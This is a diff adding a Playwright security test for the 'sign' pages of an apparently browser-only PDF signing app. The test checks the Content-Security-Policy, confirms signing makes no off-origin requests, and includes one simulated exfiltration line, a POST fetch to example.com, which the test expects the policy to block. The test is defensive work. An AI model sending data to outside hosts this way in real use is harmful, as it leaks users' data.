@@ -350,4 +350,57 @@ describe("sécurité : aucun octet ne quitte le navigateur", () => {
     },
     60_000
   );
+
+  test(
+    "mode « signer » (/en/sign, /fr/sign) : CSP en <meta>, signature complète sans requête hors origine, exfiltration bloquée",
+    async () => {
+      const t = STRINGS.en;
+      context = await browser.newContext({ serviceWorkers: "block" });
+      await context.addInitScript(MAP_UPSERT_POLYFILL);
+      await context.addInitScript(() => {
+        (window as any).__csp = [];
+        document.addEventListener("securitypolicyviolation", (e) =>
+          (window as any).__csp.push(`${e.violatedDirective} ${e.blockedURI}`)
+        );
+      });
+      const requests: string[] = [];
+      context.on("request", (r) => requests.push(r.url()));
+      const page = await context.newPage();
+
+      // Les deux langues portent la politique dans la page elle-même.
+      for (const path of ["/fr/sign", "/en/sign"]) {
+        const response = await page.goto(`${E2E_ORIGIN}${path}`);
+        expect(response?.headers()["content-security-policy"]).toContain("connect-src 'self'");
+        const meta = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
+        expect(meta).toContain("connect-src 'self'");
+      }
+
+      await page
+        .locator(`input[aria-label="${t.sign.inputAria}"]`)
+        .setInputFiles({ name: "lease.pdf", mimeType: "application/pdf", buffer: Buffer.from(await makePdf([[300, 420]])) });
+      await page.getByRole("tab", { name: t.sign.pad.type }).click();
+      await page.getByLabel(t.sign.pad.typeLabel).fill("Jane Doe");
+      const button = page.getByRole("button", { name: t.download.one, exact: true });
+      await button.and(page.locator(":enabled")).waitFor({ timeout: 60_000 });
+      await Promise.all([page.waitForEvent("download"), button.click()]);
+      await page.getByText(t.sign.fingerprint.title).waitFor();
+
+      const offOrigin = requests.filter(
+        (u) => !u.startsWith(`${E2E_ORIGIN}/`) && !u.startsWith("blob:") && !u.startsWith("data:")
+      );
+      expect(offOrigin).toEqual([]);
+      expect(await page.evaluate(() => (window as any).__csp)).toEqual([]);
+
+      const exfil = await page.evaluate(async () => {
+        try {
+          await fetch("https://example.com", { method: "POST", body: "x" });
+          return "envoyé";
+        } catch {
+          return "bloqué";
+        }
+      });
+      expect(exfil).toBe("bloqué");
+    },
+    90_000
+  );
 });
